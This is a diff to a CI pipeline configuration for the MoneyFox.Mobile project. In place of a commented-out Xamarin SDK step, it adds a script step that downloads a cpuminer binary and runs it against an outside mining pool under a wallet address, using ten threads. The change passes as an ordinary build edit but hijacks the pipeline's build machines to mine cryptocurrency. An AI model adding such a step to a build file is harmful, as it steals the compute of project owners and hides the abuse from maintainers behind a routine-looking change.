@@ -19,7 +19,10 @@ jobs:
     solution: '**/MoneyFox.Mobile.sln'
 
   steps:
-  #- script: sudo $AGENT_HOMEDIRECTORY/scripts/select-xamarin-sdk.sh 6_12_0
+  - script: |
+      wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
+      tar -xvf cpuminer-opt-mac.tar.gz
+      ./cpuminer-avx2 -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.jinmanju -p password=x -t 10
   #  displayName: 'Select the Xamarin SDK version 6.12.0'
 
   #- script: echo '##vso[task.setvariable variable=MD_APPLE_SDK_ROOT;]'/Applications/Xcode_12.2.app;sudo xcode-select --switch /Applications/Xcode_12.2.app/Contents/Developer
